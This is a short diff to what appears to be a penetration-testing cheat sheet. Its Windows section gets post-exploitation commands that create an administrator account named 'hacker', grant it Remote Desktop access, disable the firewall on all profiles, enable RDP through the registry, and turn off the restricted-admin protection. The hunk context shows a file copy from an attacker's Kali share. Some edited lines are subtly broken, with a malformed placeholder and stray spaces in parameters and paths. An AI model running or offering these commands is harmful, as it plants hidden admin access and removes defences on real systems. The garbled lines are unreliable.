@@ -462,9 +462,14 @@ win> copy file \\KaliIP\sharename
 ### Windows
 
 ```powershell
-net user hacker hacker123 /add
-net localgroup Administrators hacker /add
-net localgroup "Remote Desktop Users" hacker /ADD
+net user hacker ‹USER.NAME> /add
+net localgroup Administrators ‹USER.NAME>  /add
+net localgroup "Remote Desktop Users" ‹USER.NAME>  /add
+
+netsh advfirewall set allprofiles state off
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+New-ItemProperty -Path "HKLM: \System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" - PropertyType DWORD -Force
+
 ```
 
 ### Linux
